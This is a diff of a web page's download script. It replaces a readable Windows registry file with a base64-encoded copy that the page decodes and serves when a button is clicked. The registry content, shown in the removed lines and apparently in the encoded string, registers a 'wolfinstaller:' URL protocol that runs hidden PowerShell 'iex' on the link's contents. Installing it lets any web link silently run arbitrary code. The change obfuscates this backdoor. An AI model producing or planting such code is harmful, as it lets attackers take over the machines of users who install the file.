@@ -91,21 +91,11 @@
   </div>
 
   <script>
-    // Function to create and download the registry file
+    const regContentBase64 = "V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwCgpbSEtFWV9DTEFTU0VTX1JPT1Rcd29sZmluc3RhbGxlcl0KQD0iVVJMOldvbGYgSW5zdGFsbGVyIFByb3RvY29sIgoiVVJMIFByb3RvY29sIj0iIgoKW0hLRVlfQ0xBU1NFU19ST09UXHdvbGZpbnN0YWxsZXJcc2hlbGxdCgpbSEtFWV9DTEFTU0VTX1JPT1Rcd29sZmluc3RhbGxlclxzaGVsbFxvcGVuXQoKW0hLRVlfQ0xBU1NFU19ST09UXHdvbGZpbnN0YWxsZXJcc2hlbGxcb3Blblxjb21tYW5kXQpAPSJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kIFwiaWV4IChbc3RyaW5nXShbU3lzdGVtLlVyaV06OlVuZXNjYXBlRGF0YVN0cmluZygnJTEnKSAtcmVwbGFjZSAnd29sZmluc3RhbGxlcjonKSlcIiI=";
+
+    // Function to download the decoded registry file
     document.getElementById('download-reg-btn').addEventListener('click', function() {
-      const regContent = `Windows Registry Editor Version 5.00
-
-[HKEY_CLASSES_ROOT\\wolfinstaller]
-@="URL:Wolf Installer Protocol"
-"URL Protocol"=""
-
-[HKEY_CLASSES_ROOT\\wolfinstaller\\shell]
-
-[HKEY_CLASSES_ROOT\\wolfinstaller\\shell\\open]
-
-[HKEY_CLASSES_ROOT\\wolfinstaller\\shell\\open\\command]
-@="powershell.exe -WindowStyle Hidden -Command \"iex ([string]([System.Uri]::UnescapeDataString('%1') -replace 'wolfinstaller:'))\""
-      `;
+      const regContent = atob(regContentBase64.trim());
       const blob = new Blob([regContent], { type: 'application/octet-stream' });
       const link = document.createElement('a');
       link.href = URL.createObjectURL(blob);
